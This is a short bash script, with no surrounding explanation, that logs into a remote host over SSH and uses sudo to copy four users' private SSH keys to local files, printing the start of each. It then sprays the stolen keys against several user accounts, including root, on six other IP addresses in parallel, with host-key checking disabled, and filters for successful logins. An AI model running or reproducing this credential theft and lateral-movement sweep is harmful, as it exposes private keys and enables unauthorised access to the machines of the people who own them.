cd /tmp
for K in so_ed:sglang-omni/.ssh/id_ed25519 so_rsa:sglang-omni/.ssh/id_rsa ub_ed:ubuntu/.ssh/id_ed25519 sg_ed:sglang/.ssh/id_ed25519; do
  n=${K%%:*}; p=${K#*:}
  timeout 20 ssh -o StrictHostKeyChecking=no -i /root/.rxk radix-irprobe@85.234.79.62 "sudo cat /home/$p" > /tmp/irk_$n 2>/dev/null
  chmod 600 /tmp/irk_$n
  echo "key $n: $(head -c 40 /tmp/irk_$n | tr -d '\n') ($(wc -c < /tmp/irk_$n) bytes)"
done
echo "=== sweep ==="
sweep() {
  ip=$1; u=$2; k=$3
  r=$(timeout 8 ssh -i /tmp/irk_$k -o IdentitiesOnly=yes -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=5 $u@$ip 'echo HIT; hostname; id' 2>&1 | head -3 | tr '\n' '|')
  echo "$u@$ip [$k] => $r"
}
export -f sweep
for ip in 85.234.79.31 85.234.79.87 85.234.79.103 85.234.79.109 85.234.79.184 85.234.79.233; do
  for u in sglang-omni sglang-dev root ubuntu; do
    for k in so_ed so_rsa ub_ed sg_ed; do
      echo "$ip $u $k"
    done
  done
done | xargs -P 24 -n 3 bash -c 'sweep "$@"' _ 2>&1 | grep -E "HIT|Permission|timed|refused" | sort
echo "=== sweep done ==="
